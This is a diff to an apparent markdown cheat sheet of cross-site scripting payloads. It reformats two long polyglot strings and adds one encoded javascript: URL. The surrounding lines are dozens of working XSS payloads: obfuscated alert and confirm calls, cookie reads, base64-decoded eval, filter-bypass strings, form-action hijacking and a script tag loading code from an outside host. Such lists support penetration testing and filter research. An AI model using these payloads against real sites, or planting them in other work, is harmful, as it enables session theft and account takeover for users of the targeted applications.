@@ -43,6 +43,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   --- Please do consider that those payloads are used not for fuzzing nor to be added to a wordlist, ---
   --- there are many payloads here that would need additional actions to properly work. ---
   --- But of course, if you do wish to add them to a wordlist, then there's no problem at all! ---
+  --- I also add commentary about every/most of the payloads in the commit history --
   
   <script>alert(document.domain+"\n\n"+document.cookie);<script>
   </script><svg><script/class=rodric>alert(1)</script>-%26apos;
@@ -199,7 +200,8 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   <style>@keyframes a{}b{animation:a;}</style>
   <sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
   <Svg Only=1 OnLoad=confirm(1)>
-  JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+  JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> 
+  </Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
   "><svg onload=prompt%26%230000000040document.domain)>
   "><svg onload=prompt&#0000000040document.domain)>
   "><svg onload=alert%26%230000000040"1")>
@@ -234,7 +236,8 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   /Orders/(A(%22onerror='alert%60xss%60'testabcd))/Login.aspx?ReturnUrl=/Orders
   (A(%22onerror='alert%601%60'testabcd))/Login.aspx?ReturnUrl=%2f
   "%20onmouseenter=confirm(document.domain)%20value="
-  '"onclick=(co\u006efirm)?.0><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)1"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert2>%22%3E%3CSvg/onload=confirm3//<Script/src=//ChiragXSS.xSs.ht></scripT>
+  '"onclick=(co\u006efirm)?.0><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)1"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1>    
+  <iMg/srC/onerror=alert2>%22%3E%3CSvg/onload=confirm3//<Script/src=//ChiragXSS.xSs.ht></scripT>
   "><svg onload=document.forms[1].action='http://localhost/?Hacked'>
   ">&lt;<![\CDATA[<]]>img src=x onerror=prompt(document.domain)&gt;
   <svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
@@ -249,6 +252,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   "><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
   "document.body['innerHTML']=atob('PGltZyBzcmM9InRlc3RlLnBuZyIgb25lcnJvcj0iYWxlcnQod2luZG93Lm9yaWdpbikiPg==')
   %0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E
+  %26%2302java%26%23115cript:alert(document.domain)
   ```
 </details>
 
